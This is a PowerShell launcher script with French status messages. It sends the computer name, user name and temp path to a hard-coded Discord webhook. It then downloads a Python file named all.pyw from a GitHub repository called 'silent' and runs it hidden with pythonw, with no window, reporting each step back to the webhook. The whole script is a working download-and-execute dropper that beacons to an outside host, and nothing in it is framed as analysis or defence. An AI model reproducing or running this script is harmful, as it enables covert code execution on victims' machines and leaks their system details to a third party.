$ErrorActionPreference = 'Continue'
$WEBHOOK = 'https://discord.com/api/webhooks/1553812001174851644/XxjDh7jerGG_jVNKlmSF48UEycZFiD7PDwMGMSKiuQ7d9RWeYt-JvGOS3Y-5xPGX3D-E'

function Send-ToWebhook($title, $msg) {
    try {
        $content = "**$title** — $env:COMPUTERNAME`n``````$msg``````"
        $body = @{ content = $content } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10 > $null
    } catch {}
}

Send-ToWebhook "LAUNCHER démarré" "PS=$($PSVersionTable.PSVersion)`nUser=$env:USERNAME`nTEMP=$env:TEMP"

try {
    $tmp = Join-Path $env:TEMP 'all.pyw'

    Send-ToWebhook "Étape 1" "Téléchargement all.pyw vers $tmp"
    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $tmp -UseBasicParsing
    } catch {
        Send-ToWebhook "ERREUR téléchargement all.pyw" "$($_.Exception.Message)"
        exit 1
    }

    if (-not (Test-Path $tmp)) {
        Send-ToWebhook "ERREUR" "all.pyw non téléchargé"
        exit 1
    }

    Send-ToWebhook "Étape 2" "Recherche pythonw.exe"

    # ==== RÉSOLUTION DU PYTHON — plusieurs emplacements testés ====
    $pythonw = $null
    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\Python310\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python310\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python312\pythonw.exe'),
        'C:\Python310\pythonw.exe',
        'C:\Python311\pythonw.exe',
        'C:\Python312\pythonw.exe',
        'C:\Program Files\Python310\pythonw.exe',
        'C:\Program Files\Python311\pythonw.exe',
        'C:\Program Files\Python312\pythonw.exe'
    )

    foreach ($c in $candidates) {
        if ($c -and (Test-Path $c)) {
            $pythonw = $c
            Send-ToWebhook "pythonw trouvé" $pythonw
            break
        }
    }

    # Fallback : essayer Get-Command (si dans le PATH)
    if (-not $pythonw) {
        try {
            $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
            if ($cmd -and $cmd.Source -and (Test-Path $cmd.Source)) {
                $pythonw = $cmd.Source
                Send-ToWebhook "pythonw trouvé (PATH)" $pythonw
            }
        } catch {}
    }

    if (-not $pythonw) {
        Send-ToWebhook "ERREUR FATALE" "pythonw.exe introuvable partout : NetworkCache, Programs, C:\, Program Files, PATH"
        exit 1
    }

    Send-ToWebhook "Étape 3" "Lancement all.pyw avec $pythonw"

    # ==== LANCEMENT ====
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $pythonw
        $psi.Arguments = '"' + $tmp + '"'
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $proc = [System.Diagnostics.Process]::Start($psi)
        Send-ToWebhook "pythonw lancé OK" "PID=$($proc.Id)"
    } catch {
        Send-ToWebhook "ERREUR lancement pythonw" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
        exit 1
    }

} catch {
    Send-ToWebhook "ERREUR GLOBALE run.ps1" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
    exit 1
}

exit 0
